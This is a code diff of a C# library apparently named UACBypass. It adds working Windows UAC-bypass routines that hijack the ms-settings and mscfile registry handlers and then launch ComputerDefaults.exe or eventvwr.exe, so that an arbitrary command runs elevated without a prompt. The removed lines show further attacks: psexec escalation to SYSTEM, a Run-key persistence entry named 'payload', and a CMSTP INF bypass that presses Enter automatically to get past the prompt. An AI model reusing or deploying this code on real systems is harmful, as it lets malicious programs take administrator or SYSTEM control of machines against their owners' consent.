@@ -7,6 +7,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace UACBypass
 {
@@ -30,36 +31,20 @@ namespace UACBypass
             if (consentPromptBehaviorAdmin == "2") return false;
             else return true;
         }
-    }
 
-    public static class systemPrivBypass
-    {
-        /// <summary>
-        /// Start a process as NT AUTHORITY\System user. 
-        /// This system user has all the highest rights and privileges in a Windows Operating System.
-        /// This method requires that the application is already running as Administrator to complete privileges escalation.
-        /// </summary>
-        /// <exception cref="AdminPrivilegesException">Thrown if the application is not running as
-        /// Administrator.</exception>
-        /// <exception cref="FileNotFoundException">Thrown if the specified file cannot be found.</exception>
-        public static void startAsNTAuthoritySystem(string CommandToExecute)
+        public static bool IsUACDisabled()
         {
-            if(!Win32.IsRunAsAdmin())
-            {
-                throw new AdminPrivilegesException("This function requires that the application is running as administrator.");
-            }
+            string consentPromptBehaviorAdmin = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("ConsentPromptBehaviorAdmin").ToString();
+      
+            if (consentPromptBehaviorAdmin == "0") return true;
+            else return false;
+        }
 
-            if (!Win32.ExistsOnPath(CommandToExecute)) throw new FileNotFoundException("The system cannot find the specified file.");
-
-            //write the psexec binary into the TEMP path.
-            if (Environment.Is64BitOperatingSystem) File.WriteAllBytes(Path.GetTempPath() + "\\psexec.exe", Properties.Resources.psexec64);
-            else File.WriteAllBytes(Path.GetTempPath() + "\\psexec.exe", Properties.Resources.psexec);
-
-            //start the psexec tool to make a system privilege escalation.
+        public static void RestartAsAdmin()
+        {
             using (Process p = new Process())
             {
-                p.StartInfo.FileName = Path.GetTempPath() + "\\psexec.exe";
-                p.StartInfo.Arguments = "-s -i " + CommandToExecute + " -accepteula";
+                p.StartInfo.FileName = Application.ExecutablePath;
                 p.StartInfo.UseShellExecute = true;
                 p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 p.StartInfo.Verb = "runas";
@@ -68,240 +53,55 @@ namespace UACBypass
 
                 p.WaitForExit();
             }
-
-            //kill all psexec proccesses, otherwise the next privilege escalation may fails.
-            foreach (Process p in Process.GetProcessesByName("psexec")) { p.Kill(); }
-
-            //delete psexec file.
-            if (File.Exists(Path.GetTempPath() + "\\psexec.exe"))
-                File.Delete(Path.GetTempPath() + "\\psexec.exe");
         }
-    }
 
-    public static class EVENTVWRBypass
-    {
-        public static bool AutoElevate(string filename)
+        public static void BypassUsingComputerDefaults(string command)
         {
-            if (Win32.IsRunAsAdmin()) throw new AdminPrivilegesException("The application is already running as Administrator.");
+            if (!UAC.CanBypassUAC()) new Exception("Invalid uac configuration");
 
-            if (!UAC.CanBypassUAC()) throw new InvalidUACConfigurationException("This method doesn't support the current configuration of the User Account Control (UAC).");
+            //Set the registry key for fodhelper
+            RegistryKey newkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");
 
-            if (!File.Exists(filename)) throw new FileNotFoundException("The system cannot find the specified file.");
+            RegistryKey fod = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
+            fod.SetValue("DelegateExecute", "");
+            fod.SetValue("", @command);
+            fod.Close();
 
-
-            Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command").SetValue("", filename);
-            Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").SetValue("payload", filename);
-            System.Threading.Thread.Sleep(2000);
-
-            Process.Start("eventvwr.exe");
-
-            return true;
+            //start fodhelper
+            Process p = new Process();
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.FileName = Environment.SystemDirectory + @"\ComputerDefaults.exe";
+            p.Start();
         }
 
+        public static void BypassUsingEventViewer(string command)
+        {
+            if (!UAC.CanBypassUAC()) new Exception("Invalid uac configuration");
+
+            //Set the registry key for eventvwr
+            RegistryKey newkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+            newkey.CreateSubKey(@"mscfile\Shell\Open\command");
+
+            RegistryKey vwr = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\Shell\Open\command", true);
+            vwr.SetValue("", @command);
+            vwr.Close();
+
+            //start fodhelper
+            Process p = new Process();
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.FileName = Environment.SystemDirectory + @"\eventvwr.exe";
+            p.Start();
+        }
 
         public static void CleanRegistry()
         {
             try
             {
-                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command").DeleteValue("");
-                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue("payload");
+                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true).DeleteSubKeyTree("ms-settings");
+                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true).DeleteSubKeyTree("mscfile");
             }
-            catch(Exception) { }
-        }
-    }
-
-    public static class CMSTPBypass
-    {
-        // Our .INF file data!
-        public static string InfData = @"[version]
-        Signature=$chicago$
-        AdvancedINF=2.5
-
-        [DefaultInstall]
-        CustomDestination=CustInstDestSectionAllUsers
-        RunPreSetupCommands=RunPreSetupCommandsSection
-
-        [RunPreSetupCommandsSection]
-        ; Commands Here will be run Before Setup Begins to install
-        REPLACE_COMMAND_LINE
-        taskkill /F /IM cmstp.exe 
-
-        [CustInstDestSectionAllUsers]
-        49000,49001=AllUSer_LDIDSection, 7
-
-        [AllUSer_LDIDSection]
-        ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
-
-        [Strings]
-        ServiceName=""CorpVPN""
-        ShortSvcName=""CorpVPN""
-
-        ";
-
-        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
-        [DllImport("user32.dll")] private static extern bool IsWindowVisible(int hWnd);
-        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
-        private static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern int GetWindowThreadProcessId(IntPtr handle, out int processId);
-        /// <summary>Returns true if the current application has focus, false otherwise</summary>
-        public static bool WindowIsInForeground()
-        {
-            var activatedHandle = GetForegroundWindow();
-            if (activatedHandle == IntPtr.Zero)
-            {
-                return false;       // No window is currently activated
-            }
-
-            var procId = GetProcessId("cmstp");
-            int activeProcId;
-            GetWindowThreadProcessId(activatedHandle, out activeProcId);
-
-            return activeProcId == (int)procId;
-        }
-
-        private static int GetProcessId(string name)
-        {
-            Process[] ps = Process.GetProcessesByName(name);
-            foreach (Process p in ps)
-            {
-                return p.Id;
-            }
-
-            return 0;
-        }
-
-        public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
-
-        /// <summary>
-        /// This method generates a random named .inf file with command to be executed with UAC privileges.
-        /// </summary>
-        /// <returns>
-        /// Return a string that represents the generated .inf file.
-        /// </returns>
-        public static string SetInfFile(string CommandToExecute)
-        {
-            string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-            string TemporaryDir = "C:\\windows\\temp";
-            StringBuilder OutputFile = new StringBuilder();
-            OutputFile.Append(TemporaryDir);
-            OutputFile.Append("\\");
-            OutputFile.Append(RandomFileName);
-            OutputFile.Append(".inf");
-            StringBuilder newInfData = new StringBuilder(InfData);
-            newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
-            File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
-            return OutputFile.ToString();
-        }
-
-        /// <summary>
-        /// This method use CMSTP security vulnerability to make a privilege escalation without UAC prompting to the user for his consent.
-        /// This method works only if the user is a member of Administrators group. Otherwise, the privilege escalation fails and UAC prompt for administrator password.
-        /// CMSTP is a binary which is associated with the Microsoft Connection Manager Profile Installer. It accepts INF files which can be weaponised with malicious commands in order to execute arbitrary code in the form of scriptlets (SCT) and DLL. It is a trusted Microsoft binary which is located in the following two Windows directories.
-        /// </summary>
-        /// <returns>
-        /// Returns True if the privilege escalation has been successful.
-        /// </returns>
-        /// <exception cref="BinaryNotFoundException">Thrown if the CMSTP binary cannot be found in the System32 directory.</exception>
-        /// /// <exception cref="AdminPrivilegesException">Thrown if the application is already running as
-        /// Administrator.</exception>
-        /// <exception cref="InvalidUACConfigurationException">Thrown if the current configuration of the User Account Control (UAC)
-        /// is not supported by this method.</exception>
-        /// <exception cref="FileNotFoundException">Thrown if the specified file cannot be found.</exception>
-        public static bool AutoElevate(string CommandToExecute)
-        {
-            if (!File.Exists(BinaryPath))
-            {
-                throw new BinaryNotFoundException("Could not find cmstp.exe binary.");
-            }
-
-            if(Win32.IsRunAsAdmin()) throw new AdminPrivilegesException("The application is already running as Administrator.");
-
-            if (!UAC.CanBypassUAC()) throw new InvalidUACConfigurationException("This method doesn't support the current configuration of the User Account Control (UAC).");
-
-            if (!Win32.ExistsOnPath(CommandToExecute)) throw new FileNotFoundException("The system cannot find the specified file.");
-
-            //generate the .inf file.
-            StringBuilder InfFile = new StringBuilder();
-            InfFile.Append(SetInfFile(CommandToExecute));
-
-            //start the cmstp exploit.
-            ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
-            startInfo.Arguments = "/au " + InfFile.ToString();
-            startInfo.UseShellExecute = false;
-            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            Process.Start(startInfo);
-
-            //automatically press enter when the cmstp prompting user confirmation.
-            IntPtr windowHandle = new IntPtr();
-            windowHandle = IntPtr.Zero;
-            do
-            {
-                windowHandle = SetWindowActive("cmstp");
-            } while (windowHandle == IntPtr.Zero && !WindowIsInForeground());
-
-            do
-            {
-                System.Windows.Forms.SendKeys.SendWait("{ENTER}");
-            }
-            while (IsWindowVisible(windowHandle.ToInt32()));
-
-            //kill all cmstp proccesses, otherwise the next privilege escalation may fails.
-            foreach (Process p in Process.GetProcessesByName("cmstp")) { p.Kill(); }
-
-            return true;
-        }
-
-        /// <summary>
-        /// This method allows the user to get a Window Handle from a given process name.
-        /// </summary>
-        /// <returns>
-        /// Returns Int Pointer that represents the active Window Handle.
-        /// </returns>
-        public static IntPtr SetWindowActive(string ProcessName)
-        {
-            Process[] target = Process.GetProcessesByName(ProcessName);
-            if (target.Length == 0) return IntPtr.Zero;
-            target[0].Refresh();
-            IntPtr WindowHandle = new IntPtr();
-            WindowHandle = target[0].MainWindowHandle;
-            if (WindowHandle == IntPtr.Zero) return IntPtr.Zero;
-            SetForegroundWindow(WindowHandle);
-            ShowWindow(WindowHandle, 5);
-            return WindowHandle;
-        }
-    }
-
-    public class InvalidUACConfigurationException : Exception
-    {
-        public InvalidUACConfigurationException(string message)
-           : base(message)
-        {
-        }
-    }
-
-    public class AdminPrivilegesException : Exception
-    {
-        public AdminPrivilegesException(string message)
-           : base(message)
-        {
-        }
-    }
-
-    public class AlreadyElevatedException : Exception
-    {
-        public AlreadyElevatedException(string message)
-           : base(message)
-        {
-        }
-    }
-
-    public class BinaryNotFoundException : Exception
-    {
-        public BinaryNotFoundException(string message)
-           : base(message)
-        {
+            catch (Exception) { }
         }
     }
 }
